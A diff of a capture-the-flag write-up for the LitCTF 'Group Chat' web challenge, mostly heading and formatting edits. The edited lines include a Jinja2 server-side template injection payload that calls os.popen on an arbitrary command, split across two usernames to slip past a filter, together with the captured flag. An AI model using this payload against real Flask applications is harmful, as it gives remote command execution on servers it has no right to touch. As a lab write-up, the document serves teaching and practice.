@@ -3,7 +3,10 @@ title: Group Chat
 summary: Minimalistic chat room for ones who strive for simplicity.
 tags: [LitCTF, Web, SSTI]
 date: 2025-08-25
+showtoc: true
 ---
+
+# Group Chat
 
 ## Description
 
@@ -131,9 +134,7 @@ import sys
 URL = "http://localhost:5000"
 COMMAND = sys.argv[1]
 
-# Payload split into two usernames to bypass filtering:
-# {{config.__class__.__init__.__globals__['os'].popen('COMMAND # 
-# ').read()}}
+# {{config.__class__.__init__.__globals__['os'].popen('COMMAND # : MESSAGE').read()}}
 PAYLOAD_1 = "{{config.__class__.__init__.__globals__['os'].popen('" + COMMAND + " # "
 PAYLOAD_2 = "').read()}}"
 
@@ -262,6 +263,7 @@ PAYLOADS = [
     "msg" + MESSAGE_DEL,
 ]
 
+# Validate the retrictions
 for i in range(len(PAYLOADS)):
     if i % 2 == 0:
         assert PAYLOADS[i].endswith(
@@ -306,8 +308,7 @@ After several attempts and fine-tuning the payload, I successfully executed the 
 LITCTF{c4n7_y0u_b3l13v3_us3rn4m35_c0uld_b3_1000_ch4r5_10ng_b3f0r3??}
 ```
 
-## References
-
+# References
 
 * Payloads All The Things: [Server Side Template Injection - Python](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#jinja2)
 * Exploit Notes: [Flask Jinja2 Pentesting](https://exploit-notes.hdks.org/exploit/web/framework/flask-jinja2/)
